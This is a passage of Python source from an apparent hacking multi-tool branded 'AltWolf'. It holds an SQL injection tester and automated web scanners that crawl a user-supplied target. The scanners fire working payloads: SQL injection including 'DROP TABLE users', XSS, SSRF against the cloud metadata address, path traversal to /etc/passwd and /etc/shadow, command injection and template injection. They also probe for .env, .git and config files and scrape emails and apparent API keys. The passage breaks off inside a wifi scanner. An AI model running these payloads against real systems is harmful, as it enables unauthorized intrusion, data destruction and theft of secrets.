            f"     .--:.                           :--:              {b0}SQL Search By AltWolf{r0}{v}\n"
            "     .-----:..                   ..:----:                    Version Free\n"
            "     .--..:------:::.......::------:..--:    \n"
            "     .--.     ..::----------::...     --:    \n"
            "     .--.                             --:    \n"
            "     .--:.                           :--:    \n"
            "     .----::.                    .::----:    \n"
            "     .--..-----::::........::::-----:.--:    \n"
            "     .--.    ..::------------::..     --:    \n"
            "     .--.                             --:    \n"
            "     .:--.                          .:--.    \n"
            "       :----:.                  ..----:.     \n"
            "         .:-------------:----------:.        \n"
            f"              ...::--------::...             {r0}\n"
    )
    print(sql)

    def test_sql_injection(url, payloads):
        vulnerable_count = 0
        safe_count = 0

        print(f"\nTesting SQL injection on: {url}\n")

        sql_errors = [
            "error",
            "sql syntax",
            "mysql",
            "warning",
            "unclosed quotation",
            "quoted string",
            "sql server",
            "oracle",
            "postgresql",
            "sqlite",
            "database error",
            "syntax error",
            "unexpected end",
            "you have an error"
        ]

        for payload in payloads:
            test_url = f"{url}?id={payload}"
            try:
                response = requests.get(test_url, timeout=10)
                content = response.text.lower()

                if any(error in content for error in sql_errors):
                    print(f"[+] Possible SQL injection detected with payload: {payload}")
                    vulnerable_count += 1
                else:
                    safe_count += 1

            except requests.RequestException as e:
                print(f"[X] Error testing payload {payload}: {e}")

        print("\n" + "="*60)
        print(f"SCAN RESULTS FOR: {url}")
        print("="*60)
        print(f"Total vulnerable payloads: {vulnerable_count}")
        print(f"Total safe payloads: {safe_count}")
        print("="*60 + "\n")

    target_url = input("Enter target URL (e.g., http://example.com/page.php): ").strip()

    if not target_url.startswith("http"):
        target_url = "https://" + target_url

    sql_payloads = [
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1' OR '1'='1' /*",
        "1' AND 1=CONVERT(int, (SELECT @@version)) --",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "' OR '' = '",
        "1 OR 1=1",
        "admin' --",
        "admin' #",
        "' OR 1=1 --",
        "' OR 'x'='x",
        "1'; DROP TABLE users--",
        "1' UNION SELECT NULL--",
        "1' AND '1'='1",
        "' WAITFOR DELAY '00:00:05'--",
        "1; SELECT * FROM users",
        "' OR '1'='1' ({",
        "1' ORDER BY 1--",
        "1' UNION ALL SELECT NULL,NULL--"
    ]

    test_sql_injection(target_url, sql_payloads)
    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_15_vuln_scanner():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()

    banner = (
        f"\n{v}"
        "    ███████╗██╗   ██╗██╗     ██╗         ███████╗ ██████╗ █████╗ ███╗   ██╗\n"
        "    ██╔════╝██║   ██║██║     ██║         ██╔════╝██╔════╝██╔══██╗████╗  ██║\n"
        "    █████╗  ██║   ██║██║     ██║         ███████╗██║     ███████║██╔██╗ ██║\n"
        "    ██╔══╝  ██║   ██║██║     ██║         ╚════██║██║     ██╔══██║██║╚██╗██║\n"
        "    ██║     ╚██████╔╝███████╗███████╗    ███████║╚██████╗██║  ██║██║ ╚████║\n"
        "    ╚═╝      ╚═════╝ ╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝\n"
        f"                 {b0}Full Scanner By AltWolf{r0}{v}\n"
        f"{r0}\n"
    )
    print(banner)
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (AltWolf Scanner)"})

    target = input("Target URL: ").strip()
    if not target.startswith("http"):
        target = "https://" + target

    visited = set()
    urls = set()
    findings = []
    start_time = datetime.now()

    print(f"\n{v}[*] Target   : {target}")
    print(f"[*] Started  : {start_time.strftime('%Y-%m-%d %H:%M:%S')}{r0}\n")

    print(f"{b0}[+] Crawling...{r0}\n")

    def crawl(url, depth=0):
        if url in visited or len(visited) > 100 or depth > 3:
            return
        visited.add(url)
        try:
            r = session.get(url, timeout=10)
            urls.add(url)
            links = re.findall(r'href=["\'](.*?)["\']', r.text)
            forms = re.findall(r'<form.*?action=["\'](.*?)["\']', r.text, re.IGNORECASE)
            for link in links + forms:
                full = urljoin(url, link)
                if urlparse(full).netloc == urlparse(target).netloc:
                    crawl(full, depth + 1)
        except:
            pass

    crawl(target)
    print(f"[+] URLs found: {len(urls)}\n")

    def build_url(url, param, payload):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = payload
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def log(vuln_type, url, param="", detail=""):
        tag = f"{v}[{vuln_type}]{r0}"
        line = f"{tag} {url}"
        if param:
            line += f" -> param: {param}"
        if detail:
            line += f" | {detail}"
        print(line)
        findings.append({"type": vuln_type, "url": url, "param": param, "detail": detail})

    print(f"{b0}[*] Testing XSS...{r0}")
    xss_payloads = [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        "'><svg onload=alert(1)>",
    ]
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in xss_payloads:
                try:
                    r = session.get(build_url(url, param, payload), timeout=10)
                    if payload in r.text:
                        log("XSS", url, param, payload)
                        break
                except:
                    pass

    print(f"{b0}[*] Testing SQLi...{r0}")
    sqli_payloads = ["'", '"', "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1"]
    sqli_errors = [
        "you have an error in your sql",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "syntax error",
        "pg_query()",
        "sqlite_",
        "ORA-",
    ]
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in sqli_payloads:
                try:
                    r = session.get(build_url(url, param, payload), timeout=10)
                    for err in sqli_errors:
                        if err.lower() in r.text.lower():
                            log("SQLi", url, param, err)
                            break
                except:
                    pass

    print(f"{b0}[*] Testing IDOR...{r0}")
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            try:
                r1 = session.get(build_url(url, param, "1"), timeout=10)
                r2 = session.get(build_url(url, param, "2"), timeout=10)
                r3 = session.get(build_url(url, param, "9999"), timeout=10)
                if r1.text != r2.text and abs(len(r1.text) - len(r2.text)) > 30:
                    log("IDOR", url, param)
                if r1.status_code == 200 and r3.status_code == 200 and r1.text != r3.text:
                    log("IDOR?", url, param, "id=1 vs id=9999 differ")
            except:
                pass

    print(f"{b0}[*] Testing Open Redirect...{r0}")
    redirect_payloads = [
        "https://example.com",
        "//example.com",
        "/\\example.com",
        "https:///example.com",
    ]
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in redirect_payloads:
                try:
                    r = session.get(build_url(url, param, payload), allow_redirects=False, timeout=10)
                    loc = r.headers.get("Location", "")
                    if "example.com" in loc:
                        log("Open Redirect", url, param, loc)
                        break
                except:
                    pass

    print(f"{b0}[*] Testing SSRF...{r0}")
    ssrf_payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://0.0.0.0",
    ]
    ssrf_signs = ["localhost", "127.0.0.1", "ami-id", "instance-id", "root:x"]
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in ssrf_payloads:
                try:
                    r = session.get(build_url(url, param, payload), timeout=10)
                    for sign in ssrf_signs:
                        if sign in r.text.lower():
                            log("SSRF", url, param, payload)
                            break
                except:
                    pass

    print(f"{b0}[*] Testing LFI / Traversal...{r0}")
    lfi_payloads = [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../windows/win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in lfi_payloads:
                try:
                    r = session.get(build_url(url, param, payload), timeout=10)
                    if "root:x:0:0:" in r.text or "[extensions]" in r.text:
                        log("LFI", url, param, payload)
                        break
                except:
                    pass
        try:
            r = session.get(url + "/../../../../etc/passwd", timeout=10)
            if "root:x:" in r.text:
                log("Path Traversal", url)
        except:
            pass

    print(f"{b0}[*] Testing CMDi...{r0}")
    cmdi_payloads = [";id", "|id", "&&id", "`id`", ";whoami", "| whoami", "$(whoami)"]
    cmdi_signs = ["uid=", "root", "www-data", "apache"]
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in cmdi_payloads:
                try:
                    r = session.get(build_url(url, param, payload), timeout=10)
                    for sign in cmdi_signs:
                        if sign in r.text:
                            log("CMDi", url, param, payload)
                            break
                except:
                    pass

    print(f"{b0}[*] Testing SSTI...{r0}")
    ssti_payloads = {
        "{{7*7}}": "49",
        "${7*7}": "49",
        "#{7*7}": "49",
        "<%= 7*7 %>": "49",
        "{{7*'7'}}": "7777777",
    }
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload, expected in ssti_payloads.items():
                try:
                    r = session.get(build_url(url, param, payload), timeout=10)
                    if expected in r.text:
                        log("SSTI", url, param, f"payload={payload} -> {expected}")
                        break
                except:
                    pass

    print(f"{b0}[*] Checking sensitive files...{r0}")
    sensitive_paths = [
        ".git/config", ".env", ".env.local", ".env.backup",
        "backup.zip", "backup.tar.gz", "db.sql", "dump.sql",
        "config.php", "config.yml", "config.json",
        "wp-config.php", "settings.py", "database.yml",
        "phpinfo.php", "info.php", "test.php",
        "admin/", "administrator/", "panel/",
        "robots.txt", "sitemap.xml",
        "/.well-known/security.txt",
        "server-status", "server-info",
        "crossdomain.xml", "clientaccesspolicy.xml",
    ]
    for path in sensitive_paths:
        try:
            r = session.get(target.rstrip("/") + "/" + path, timeout=10)
            if r.status_code == 200 and len(r.text) > 20:
                log("Sensitive File", target + "/" + path, detail=f"status={r.status_code} size={len(r.text)}")
        except:
            pass

    print(f"{b0}[*] Checking HTTP headers...{r0}")
    try:
        r = session.get(target, timeout=10)
        h = r.headers

        security_headers = {
            "Content-Security-Policy": "CSP missing",
            "X-Frame-Options": "Clickjacking possible",
            "X-Content-Type-Options": "MIME sniffing possible",
            "Strict-Transport-Security": "HSTS missing",
            "Referrer-Policy": "Referrer-Policy missing",
            "Permissions-Policy": "Permissions-Policy missing",
        }
        for header, msg in security_headers.items():
            if header not in h:
                log("Missing Header", target, detail=msg)

        server = h.get("Server", "")
        x_powered = h.get("X-Powered-By", "")
        if server:
            log("Info Disclosure", target, detail=f"Server: {server}")
        if x_powered:
            log("Info Disclosure", target, detail=f"X-Powered-By: {x_powered}")

        if "Access-Control-Allow-Origin" in h:
            if h["Access-Control-Allow-Origin"] == "*":
                log("CORS", target, detail="Wildcard origin allowed")
    except:
        pass

    print(f"{b0}[*] Checking SSL/TLS...{r0}")
    try:
        hostname = urlparse(target).hostname
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
            s.settimeout(10)
            s.connect((hostname, 443))
            cert = s.getpeercert()
            expire_str = cert.get("notAfter", "")
            if expire_str:
                expire_date = datetime.strptime(expire_str, "%b %d %H:%M:%S %Y %Z")
                days_left = (expire_date - datetime.now()).days
                if days_left < 30:
                    log("SSL", target, detail=f"Certificate expires in {days_left} days")
                else:
                    print(f"  [SSL] Certificate valid - {days_left} days left")
    except ssl.SSLError as e:
        log("SSL", target, detail=str(e))
    except:
        pass

    print(f"{b0}[*] Checking cookies...{r0}")
    try:
        r = session.get(target, timeout=10)
        for cookie in r.cookies:
            issues = []
            if not cookie.secure:
                issues.append("no Secure flag")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append("no HttpOnly flag")
            if not cookie.has_nonstandard_attr("SameSite"):
                issues.append("no SameSite flag")
            if issues:
                log("Cookie", target, cookie.name, " | ".join(issues))
    except:
        pass

    elapsed = datetime.now() - start_time
    print(f"\n{v}{'─'*60}")
    print(f"  Results By AltWolf  -  {elapsed.seconds}s elapsed")
    print(f"{'─'*60}{r0}\n")

    if not findings:
        print("  No vulnerabilities found.\n")
    else:
        types = {}
        for f in findings:
            types[f["type"]] = types.get(f["type"], 0) + 1

        print(f"  Total findings : {len(findings)}")
        for t, count in types.items():
            print(f"  {b0}[{t}]{r0} x{count}")

        print()
        for f in findings:
            detail = f" | {f['detail']}" if f["detail"] else ""
            param  = f" -> {f['param']}" if f["param"] else ""
            print(f"  {v}[+]{r0} {f['type']}{param} - {f['url']}{detail}")

    input(f"\n{b0}Press enter to continue...{r0}")


    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_16_web_scanner():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()

    bannerz = (
        f"\n{v}"
        "    ██╗    ██╗███████╗██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗\n"
        "    ██║    ██║██╔════╝██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║\n"
        "    ██║ █╗ ██║█████╗  ██████╔╝    ███████╗██║     ███████║██╔██╗ ██║\n"
        "    ██║███╗██║██╔══╝  ██╔══██╗    ╚════██║██║     ██╔══██║██║╚██╗██║\n"
        "    ╚███╔███╔╝███████╗██████╔╝    ███████║╚██████╗██║  ██║██║ ╚████║\n"
        "     ╚══╝╚══╝ ╚══════╝╚═════╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝\n"
        f"              {b0}Web Scan By AltWolf{r0}{v}\n"
        f"{r0}\n"
    )
    print(bannerz)

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (AltWolf Analyzer)"})

    target = input("Target URL: ").strip()
    if not target.startswith("http"):
        target = "https://" + target

    start_time = datetime.now()
    findings = []

    print(f"\n{v}[*] Target  : {target}")
    print(f"[*] Started : {start_time.strftime('%Y-%m-%d %H:%M:%S')}{r0}\n")

    def log(category, label, detail=""):
        tag = f"{v}[{category}]{r0}"
        line = f"{tag} {label}"
        if detail:
            line += f" | {detail}"
        print(line)
        findings.append({"category": category, "label": label, "detail": detail})

    try:
        r = session.get(target, timeout=15)
        html = r.text
        headers = r.headers
        status = r.status_code
    except Exception as e:
        print(f"[!] Failed to reach target: {e}")
        input(f"\n{b0}Press enter to continue...{r0}")
        return

    print(f"{b0}[*] Analyzing page info...{r0}")
    log("Status", f"HTTP {status}", f"size={len(html)} bytes")

    title = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
    if title:
        log("Title", title.group(1).strip())

    description = re.search(r'<meta[^>]+name=["\']description["\'][^>]+content=["\'](.*?)["\']', html, re.IGNORECASE)
    if description:
        log("Meta Description", description.group(1).strip())

    keywords = re.search(r'<meta[^>]+name=["\']keywords["\'][^>]+content=["\'](.*?)["\']', html, re.IGNORECASE)
    if keywords:
        log("Meta Keywords", keywords.group(1).strip())

    generator = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\'](.*?)["\']', html, re.IGNORECASE)
    if generator:
        log("Generator", generator.group(1).strip())

    charset = re.search(r'<meta[^>]+charset=["\'](.*?)["\']', html, re.IGNORECASE)
    if charset:
        log("Charset", charset.group(1).strip())

    viewport = re.search(r'<meta[^>]+name=["\']viewport["\'][^>]+content=["\'](.*?)["\']', html, re.IGNORECASE)
    if viewport:
        log("Viewport", viewport.group(1).strip())

    print(f"\n{b0}[*] Detecting technologies...{r0}")

    tech_signatures = {
        "WordPress":       [r"wp-content", r"wp-includes", r"wordpress"],
        "Joomla":          [r"/components/com_", r"Joomla!"],
        "Drupal":          [r"Drupal\.settings", r"/sites/default/files"],
        "Laravel":         [r"laravel_session", r"Laravel"],
        "Django":          [r"csrfmiddlewaretoken", r"__django"],
        "React":           [r"react\.development\.js", r"react\.production\.min\.js", r"__react"],
        "Vue.js":          [r"vue\.js", r"vue\.min\.js", r"__vue__"],
        "Angular":         [r"ng-version", r"angular\.min\.js"],
        "jQuery":          [r"jquery\.min\.js", r"jquery-\d"],
        "Bootstrap":       [r"bootstrap\.min\.css", r"bootstrap\.min\.js"],
        "Tailwind":        [r"tailwind\.css", r"tailwindcss"],
        "Next.js":         [r"__NEXT_DATA__", r"/_next/static"],
        "Nuxt.js":         [r"__NUXT__", r"/_nuxt/"],
        "Symfony":         [r"symfony", r"sf-toolbar"],
        "CodeIgniter":     [r"CodeIgniter", r"ci_session"],
        "Ruby on Rails":   [r"authenticity_token", r"rails-ujs"],
        "ASP.NET":         [r"__VIEWSTATE", r"ASP\.NET"],
        "PHP":             [r"\.php", r"PHPSESSID"],
        "Google Analytics":[r"google-analytics\.com/analytics\.js", r"gtag\("],
        "Google Tag Mgr":  [r"googletagmanager\.com"],
        "Cloudflare":      [r"cdn-cgi/", r"__cfduid", r"cloudflare"],
        "Font Awesome":    [r"font-awesome", r"fontawesome"],
        "Google Fonts":    [r"fonts\.googleapis\.com"],
    }

    detected = []
    for tech, patterns in tech_signatures.items():
        for pattern in patterns:
            if re.search(pattern, html, re.IGNORECASE):
                detected.append(tech)
                log("Tech", tech)
                break

    if not detected:
        print("  No known technologies detected.")

    print(f"\n{b0}[*] Extracting scripts...{r0}")
    scripts = re.findall(r'<script[^>]*src=["\'](.*?)["\']', html, re.IGNORECASE)
    inline_scripts = re.findall(r'<script(?![^>]*src)[^>]*>(.*?)</script>', html, re.IGNORECASE | re.DOTALL)
    for s in scripts:
        log("Script", s)
    log("Inline Scripts", f"{len(inline_scripts)} found")

    print(f"\n{b0}[*] Extracting stylesheets...{r0}")
    styles = re.findall(r'<link[^>]+rel=["\']stylesheet["\'][^>]+href=["\'](.*?)["\']', html, re.IGNORECASE)
    for s in styles:
        log("Stylesheet", s)

    print(f"\n{b0}[*] Extracting links...{r0}")
    links = re.findall(r'href=["\'](.*?)["\']', html)
    internal = set()
    external = set()
    base_domain = urlparse(target).netloc
    for link in links:
        full = urljoin(target, link)
        parsed = urlparse(full)
        if parsed.scheme in ("http", "https"):
            if parsed.netloc == base_domain:
                internal.add(full)
            else:
                external.add(full)
    log("Internal Links", f"{len(internal)} found")
    log("External Links", f"{len(external)} found")
    for lnk in list(external)[:20]:
        log("Ext Link", lnk)

    print(f"\n{b0}[*] Extracting forms...{r0}")
    forms = re.findall(r'<form(.*?)>', html, re.IGNORECASE | re.DOTALL)
    for i, form in enumerate(forms):
        action = re.search(r'action=["\'](.*?)["\']', form, re.IGNORECASE)
        method = re.search(r'method=["\'](.*?)["\']', form, re.IGNORECASE)
        act = action.group(1) if action else "none"
        meth = method.group(1).upper() if method else "GET"
        log("Form", f"form_{i+1}", f"action={act} method={meth}")

    inputs = re.findall(r'<input[^>]+>', html, re.IGNORECASE)
    for inp in inputs:
        name = re.search(r'name=["\'](.*?)["\']', inp, re.IGNORECASE)
        itype = re.search(r'type=["\'](.*?)["\']', inp, re.IGNORECASE)
        n = name.group(1) if name else "unnamed"
        t = itype.group(1) if itype else "text"
        log("Input", n, f"type={t}")

    print(f"\n{b0}[*] Extracting images...{r0}")
    images = re.findall(r'<img[^>]+src=["\'](.*?)["\']', html, re.IGNORECASE)
    log("Images", f"{len(images)} found")
    for img in images[:10]:
        log("Img", img)

    print(f"\n{b0}[*] Extracting emails and phones...{r0}")
    emails = set(re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', html))
    phones = set(re.findall(r'(\+?\d[\d\s\-().]{7,}\d)', html))
    for email in emails:
        log("Email", email)
    for phone in list(phones)[:10]:
        log("Phone", phone.strip())

    print(f"\n{b0}[*] Extracting comments...{r0}")
    comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
    useful = [c.strip() for c in comments if len(c.strip()) > 5 and not re.match(r'^\[if', c)]
    log("HTML Comments", f"{len(useful)} found")
    for c in useful[:10]:
        log("Comment", c[:120])

    print(f"\n{b0}[*] Extracting API endpoints and paths...{r0}")
    api_patterns = re.findall(r'["\'](/api/[^"\']+)["\']', html)
    route_patterns = re.findall(r'["\'](/[a-zA-Z0-9_\-/]+\.(?:php|asp|aspx|jsp|json|xml))["\']', html)
    for ep in set(api_patterns):
        log("API Endpoint", ep)
    for rp in set(route_patterns):
        log("Route", rp)

    print(f"\n{b0}[*] Extracting JS variables and keys...{r0}")
    js_vars = re.findall(r'(?:var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']{4,80})["\']', html)
    for var, val in js_vars[:20]:
        log("JS Var", var, val)

    potential_keys = re.findall(r'(?:key|token|secret|api|auth|password|pass|pwd)["\']?\s*[=:]\s*["\']([a-zA-Z0-9_\-]{8,})["\']', html, re.IGNORECASE)
    for key in potential_keys:
        log("Potential Key", key)

    print(f"\n{b0}[*] Analyzing HTTP headers...{r0}")
    for hname, hval in headers.items():
        log("Header", hname, hval)

    print(f"\n{b0}[*] Checking DNS / IP...{r0}")
    try:
        hostname = urlparse(target).hostname
        ip = socket.gethostbyname(hostname)
        log("IP Address", ip)
        try:
            reverse = socket.gethostbyaddr(ip)
            log("Reverse DNS", reverse[0])
        except:
            pass
    except:
        pass

    print(f"\n{b0}[*] Checking SSL certificate...{r0}")
    try:
        hostname = urlparse(target).hostname
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
            s.settimeout(10)
            s.connect((hostname, 443))
            cert = s.getpeercert()
            subject = dict(x[0] for x in cert.get("subject", []))
            issuer  = dict(x[0] for x in cert.get("issuer", []))
            not_before = cert.get("notBefore", "")
            not_after  = cert.get("notAfter", "")
            san = cert.get("subjectAltName", [])
            log("SSL Subject",  subject.get("commonName", ""))
            log("SSL Issuer",   issuer.get("organizationName", ""))
            log("SSL Valid From", not_before)
            log("SSL Valid To",   not_after)
            for _, san_val in san:
                log("SSL SAN", san_val)
            if not_after:
                expire_date = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                days_left = (expire_date - datetime.now()).days
                log("SSL Expiry", f"{days_left} days remaining")
    except Exception as e:
        log("SSL", "Could not retrieve certificate", str(e))

    print(f"\n{b0}[*] Checking robots.txt and sitemap...{r0}")
    for path in ["robots.txt", "sitemap.xml", "sitemap_index.xml"]:
        try:
            res = session.get(target.rstrip("/") + "/" + path, timeout=10)
            if res.status_code == 200:
                log("Found", path, f"{len(res.text)} bytes")
                for line in res.text.splitlines()[:15]:
                    if line.strip():
                        log(path, line.strip())
        except:
            pass

    elapsed = datetime.now() - start_time
    print(f"\n{v}{'─'*60}")
    print(f"  Source Analysis Report By AltWolf  -  {elapsed.seconds}s elapsed")
    print(f"{'─'*60}{r0}\n")

    if not findings:
        print("  Nothing found.\n")
    else:
        categories = {}
        for f in findings:
            categories[f["category"]] = categories.get(f["category"], 0) + 1

        print(f"  Total entries : {len(findings)}\n")
        for cat, count in categories.items():
            print(f"  {b0}[{cat}]{r0} x{count}")

        print()
        for f in findings:
            detail = f" | {f['detail']}" if f["detail"] else ""
            print(f"  {v}[+]{r0} [{f['category']}] {f['label']}{detail}")




    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_17_wifi_scanner():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()

    sys.stdout.write(clrscr())

    bann = (
        f"\n{v}"
        "    ██╗    ██╗██╗███████╗██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗\n"
        "    ██║    ██║██║██╔════╝██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║\n"
        "    ██║ █╗ ██║██║█████╗  ██║    ███████╗██║     ███████║██╔██╗ ██║\n"
        "    ██║███╗██║██║██╔══╝  ██║    ╚════██║██║     ██╔══██║██║╚██╗██║\n"
        "    ╚███╔███╔╝██║██║     ██║    ███████║╚██████╗██║  ██║██║ ╚████║\n"
        "     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝\n"
        f"              {b0}Wifi Scan By AltWolf{r0}{v}\n"
        f"{r0}\n"
    )
    print(bann)


    findings = []
    start_time = datetime.now()
    os_type = platform.system()

    print(f"{v}[*] System  : {os_type}")
    print(f"[*] Started : {start_time.strftime('%Y-%m-%d %H:%M:%S')}{r0}\n")

    def log(category, label, detail=""):
        tag = f"{v}[{category}]{r0}"
        line = f"{tag} {label}"
        if detail:
            line += f" | {detail}"
        print(line)
        findings.append({"category": category, "label": label, "detail": detail})

    def signal_bar(signal):
        try:
            s = int(signal)
            if s >= -50:  bars = "|||||||||| Excellent"
            elif s >= -60: bars = "||||||||   Good"
            elif s >= -70: bars = "||||||     Fair"
            elif s >= -80: bars = "||||       Weak"
            else:          bars = "||         Poor"
            return f"{s} dBm  {bars}"
        except:
            return signal

    def security_label(sec):
        sec = sec.upper()
        if "WPA3" in sec:  return f"{sec}  [Strong]"
        if "WPA2" in sec:  return f"{sec}  [Good]"
        if "WPA"  in sec:  return f"{sec}  [Moderate]"
        if "WEP"  in sec:  return f"{sec}  [Weak - crackable]"
        if "OPEN" in sec or sec == "":
            return "OPEN  [No encryption]"
        return sec

    def channel_band(channel):
        try:
            ch = int(channel)
            if ch <= 14:
                return f"Ch {ch}  [2.4 GHz]"
            else:
                return f"Ch {ch}  [5 GHz]"
        except:
            return channel

    networks = []

    if os_type == "Linux":
        print(f"{b0}[*] Scanning with nmcli...{r0}\n")
        try:
            result = subprocess.run(
                ["nmcli", "-t", "-f",
                 "SSID,BSSID,MODE,CHAN,FREQ,RATE,SIGNAL,SECURITY",
                 "dev", "wifi", "list", "--rescan", "yes"],
                capture_output=True, text=True, timeout=20
            )
            for line in result.stdout.strip().splitlines():
                parts = line.split(":")
                if len(parts) >= 8:
                    networks.append({
                        "ssid":     parts[0] or "Hidden",
                        "bssid":    parts[1],
                        "mode":     parts[2],
                        "channel":  parts[3],
                        "freq":     parts[4],
                        "rate":     parts[5],
                        "signal":   parts[6],
                        "security": parts[7],
                    })
        except FileNotFoundError:
            print(f"{b0}[*] nmcli not found, trying iwlist...{r0}\n")
            try:
                iface_result = subprocess.run(["iwconfig"], capture_output=True, text=True)
                iface = re.findall(r'^(\w+)\s+IEEE', iface_result.stdout, re.MULTILINE)
                iface = iface[0] if iface else "wlan0"

                result = subprocess.run(
                    ["sudo", "iwlist", iface, "scan"],
                    capture_output=True, text=True, timeout=20
                )
                cells = result.stdout.split("Cell ")
                for cell in cells[1:]:
                    ssid     = re.search(r'ESSID:"(.*?)"', cell)
                    bssid    = re.search(r'Address: ([\w:]+)', cell)
                    signal   = re.search(r'Signal level=([-\d]+)', cell)
                    channel  = re.search(r'Channel:(\d+)', cell)
                    enc      = re.search(r'Encryption key:(on|off)', cell)
                    wpa      = re.search(r'(WPA\d?)', cell)
                    freq     = re.search(r'Frequency:([\d.]+ \w+)', cell)
                    rate     = re.search(r'Bit Rates:([\d.]+ \w+/s)', cell)
                    networks.append({
                        "ssid":     ssid.group(1)   if ssid    else "Hidden",
                        "bssid":    bssid.group(1)  if bssid   else "Unknown",
                        "mode":     "Infra",
                        "channel":  channel.group(1) if channel else "?",
                        "freq":     freq.group(1)   if freq    else "?",
                        "rate":     rate.group(1)   if rate    else "?",
                        "signal":   signal.group(1) if signal  else "?",
                        "security": wpa.group(1)    if wpa     else ("WEP" if enc and enc.group(1) == "on" else "OPEN"),
                    })
            except Exception as e:
                print(f"[!] iwlist error: {e}")

    elif os_type == "Darwin":
        print(f"{b0}[*] Scanning with airport...{r0}\n")
        try:
            result = subprocess.run(
                ["/System/Library/PrivateFrameworks/Apple80211.framework"
                 "/Versions/Current/Resources/airport", "-s"],
                capture_output=True, text=True, timeout=20
            )
            lines = result.stdout.strip().splitlines()
            for line in lines[1:]:
                parts = line.split()
                if len(parts) >= 6:
                    networks.append({
                        "ssid":     parts[0],
                        "bssid":    parts[1],
                        "signal":   parts[2],
                        "channel":  parts[3],
                        "mode":     parts[6] if len(parts) > 6 else "?",
                        "freq":     "5 GHz" if int(parts[3]) > 14 else "2.4 GHz",
                        "rate":     "?",
                        "security": parts[6] if len(parts) > 6 else "?",
                    })
        except Exception as e:
            print(f"[!] airport error: {e}")

    elif os_type == "Windows":
        print(f"{b0}[*] Scanning with netsh...{r0}\n")
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                capture_output=True, text=True, timeout=20
            )
            blocks = result.stdout.split("SSID")
            for block in blocks[1:]:
                ssid     = re.search(r':\s(.+)', block)
                bssid    = re.search(r'BSSID\s+\d+\s*:\s+([\w:]+)', block)
                signal   = re.search(r'Signal\s*:\s*(\d+)%', block)
                channel  = re.search(r'Channel\s*:\s*(\d+)', block)
                security = re.search(r'Authentication\s*:\s*(.+)', block)
                cipher   = re.search(r'Cipher\s*:\s*(.+)', block)
                raw_sig  = int(signal.group(1)) if signal else 0
                dbm      = str((raw_sig // 2) - 100)
                networks.append({
                    "ssid":     ssid.group(1).strip()     if ssid     else "Hidden",
                    "bssid":    bssid.group(1).strip()    if bssid    else "Unknown",
                    "signal":   dbm,
                    "channel":  channel.group(1).strip()  if channel  else "?",
                    "security": security.group(1).strip() if security else "OPEN",
                    "mode":     "Infra",
                    "freq":     "?",
                    "rate":     cipher.group(1).strip()   if cipher   else "?",
                })
        except Exception as e:
            print(f"[!] netsh error: {e}")

    else:
        print(f"[!] Unsupported OS: {os_type}")
        input(f"\n{b0}Press enter to continue...{r0}")
        return

    networks.sort(key=lambda x: int(x["signal"]) if x["signal"].lstrip("-").isdigit() else -999, reverse=True)

    print(f"\n{v}{'─'*65}")
    print(f"  Networks found : {len(networks)}")
    print(f"{'─'*65}{r0}\n")

    for i, net in enumerate(networks, 1):
        print(f"  {b0}[{i}] {net['ssid']}{r0}")
        log("SSID",     net["ssid"])
